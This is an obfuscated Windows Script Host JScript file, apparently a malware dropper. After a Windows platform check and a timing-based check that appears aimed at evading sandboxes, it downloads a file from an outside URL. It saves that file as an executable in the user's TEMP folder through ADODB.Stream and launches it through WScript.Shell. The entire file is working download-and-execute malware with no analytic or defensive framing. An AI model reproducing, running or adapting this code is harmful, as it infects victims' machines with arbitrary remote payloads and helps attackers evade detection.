var _X1 = false;
var _G = "CreateObject";
var _U0 = function _SN() {return WScript[_G]("WScript"+".Shell");}(), _Z0 = 11;
var _J = "MSXML2.XMLHTTP";
var _F = 2123213;
var _LD = 0;
function _X0(_P){_U0["Run"](_P, _LD, _LD);};
function _D0(){return _J + "";};
function _JP(_TC, _WV){_LD = _LD * 1; return _TC - _WV;};
function _XM(){return _G;};
/*@cc_on
  @if (@_win32 || @_win64)
    _X1 = true;
  @end
@*/
if (_X1)
{
var _ZD = "";
function _D(){return 22;};
var _N0 = 0; var _T = 0;
function _U()
{
var _M = new this["Date"]();
var _A0 = _M["getUTCMilliseconds"]();
WScript["Sleep"](_D());
var _M = new this["Date"]();
var _A = _M["getUTCMilliseconds"]();
WScript["Sleep"](_D());
var _M = new this["Date"]();
var _N = _M["getUTCMilliseconds"]();
var _N0 = "_Z";
_N0 = _JP(_A, _A0);
var _T = "_VA";
_T = _JP(_N, _A);
_ZD = "open";
return _JP(_N0, _T);
}
var _T0 = false;
var _UD = false;
for (var _QN = _LD; _QN < _D() * 1; _QN++){if (_U() != _LD){
_T0 = true; 
_T = "31" + 11 * _N0 + _T; 
_UD = true; 
break;
}}
function _X() {return ((_T0 == true) && (_T0 == _UD)) ? 1 : _LD;};
if (_T0 && _X() && _UD){
function _SD() {return _U0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "dJdRovrI5R2r6wo.ex" + "e";};
 _RI = _D0();
 _NN = WScript[_G](_RI);
 var _MB = 1;
 while (_MB){
try {
	if (_MB == 1)
	{
		_NN[_ZD]("GET", "http://linkownia.itcom.pl/s9aps", false);
		_NN["send"]();
		_MW = "Sleep";
	}
	WScript[_MW](_D() + 120); 
	if (_NN["readystate"] < 2 * 2) continue;
	_MB = _LD;
	function _H(_BP) {var _CP = (1, 2, 3, 4, 5, _BP); return _CP;};
	_WC = WScript[_XM()]("ADODB.Stream");
	_RI = _WC;
	_RI[_ZD]();
	_RI["type"] = _H(1);
	_RI["write"](_NN["ResponseBody"]);
	_WC["position"] = _H(_LD);
	_RI["Save" + "ToFile"](_SD(), 2);
	_WC["cl"+"ose"]();
	_FI = _SD();
	_X0(_FI);
} catch(_NZ){};
}
}
}

